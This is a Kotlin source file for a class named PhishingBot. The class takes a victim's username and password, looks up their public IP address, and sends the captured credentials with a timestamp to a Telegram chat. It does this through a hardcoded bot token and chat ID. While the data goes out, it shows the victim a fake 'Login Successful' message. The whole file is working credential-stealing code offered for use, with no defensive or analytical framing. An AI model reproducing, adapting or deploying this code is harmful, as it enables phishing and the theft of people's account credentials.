import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class PhishingBot {
    companion object {
        private const val BOT_TOKEN = "8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc"
        private const val CHAT_ID = "8820979221"
    }

    private val _status = MutableStateFlow("Waiting for input...")
    val status: StateFlow<String> = _status.asStateFlow()

    fun submitData(username: String, password: String) {
        CoroutineScope(Dispatchers.IO).launch {
            _status.value = "Verifying..."
            
            val ipAddress = getIpAddress()
            val timestamp = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault())
                .format(java.util.Date())

            val message = """
🔐 *New Login Captured!*

👤 *Username:* $username
🔑 *Password:* $password
🌐 *IP Address:* $ipAddress
🕒 *Time:* $timestamp
            """.trimIndent()

            try {
                sendToTelegram(message.trimIndent())
                withContext(Dispatchers.Main) {
                    _status.value = "Login Successful! Redirecting..."
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    _status.value = "Error sending data: ${e.message}"
                }
            }
        }
    }

    private suspend fun getIpAddress(): String {
        try {
            val url = URL("https://api.ipify.org?format=json")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            
            val responseCode = connection.responseCode
            if (responseCode == HttpURLConnection.HTTP_OK) {
                val inputStream = connection.inputStream.bufferedReader()
                val response = inputStream.readText()
                val json = JSONObject(response)
                return json.getString("ip")
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return "Unknown"
    }

    private suspend fun sendToTelegram(message: String) {
        val telegramUrl = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=${java.net.URLEncoder.encode(message, "UTF-8")}&parse_mode=Markdown"
        val url = URL(telegramUrl)
        val connection = url.openConnection() as HttpURLConnection
        connection.requestMethod = "GET"
        connection.connectTimeout = 5000
        connection.readTimeout = 5000
        connection.inputStream.bufferedReader().use { it.readText() }
    }
}

// Usage Example
fun main() {
    val bot = PhishingBot()
    // Simulate a login
    bot.submitData("admin", "SecretPassword123")
}
